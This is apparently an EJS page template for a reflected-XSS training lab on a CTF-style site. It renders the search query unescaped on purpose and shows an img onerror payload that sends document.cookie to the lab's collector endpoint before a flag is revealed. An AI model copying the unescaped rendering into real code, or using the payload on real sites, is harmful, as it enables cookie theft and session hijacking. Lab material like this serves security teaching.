<!doctype html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SecureShop — Search</title>
<link rel="stylesheet" href="/css/lab.css">
</head>
<body data-theme="xss">
<div class="lab-topbar"><a class="lab-back" href="/challenges">&larr; ZeroDay Academy</a><span class="name">SecureShop</span><span class="tag">/labs/reflected-xss</span></div>
<div class="lab-wrap">
  <div class="lab-card">
    <h1>Product Search</h1>
    <form method="GET" action="/labs/reflected-xss">
      <div class="lab-row">
        <div><input name="q" placeholder="Search products..." value="<%= q %>"></div>
        <div style="flex:0;"><button type="submit">Search</button></div>
      </div>
    </form>
    <% if (q) { %>
      <p>Showing results for: <%- q %></p>
    <% } %>
    <p class="lab-meta">The search term is reflected into the page without escaping. Execute script that sends the proof cookie to the collector.</p>
    <pre class="lab-code">&lt;img src=x onerror="fetch('/labs/reflected-xss/collect?p='+encodeURIComponent(document.cookie))"&gt;</pre>
  </div>

  <div class="lab-card">
    <ul class="lab-list">
      <% matches.forEach(p => { %>
        <li><%= p.name %> <span class="lab-meta" style="float:right;"><%= p.price %></span></li>
      <% }) %>
      <% if (matches.length === 0) { %><li class="lab-meta">No products matched.</li><% } %>
    </ul>
  </div>

  <div class="lab-card">
    <h2>Verification</h2>
    <button type="button" class="secondary" id="checkReflected">Check verification</button>
    <pre class="lab-code" id="reflectedResult" style="margin-top:0.8rem;">Not checked yet.</pre>
  </div>

  <form method="POST" action="/labs/reflected-xss/reset"><button type="submit" class="secondary">Reset lab</button></form>
</div>
<script>
  document.getElementById('checkReflected').addEventListener('click', async function () {
    const out = document.getElementById('reflectedResult');
    try {
      const response = await fetch('/labs/reflected-xss/status');
      const data = await response.json();
      out.textContent = JSON.stringify(data, null, 2);
      if (data.flag) out.textContent += '\n\nFLAG: ' + data.flag;
    } catch (error) {
      out.textContent = 'Status check failed: ' + error.message;
    }
  });
</script>
</body>
</html>
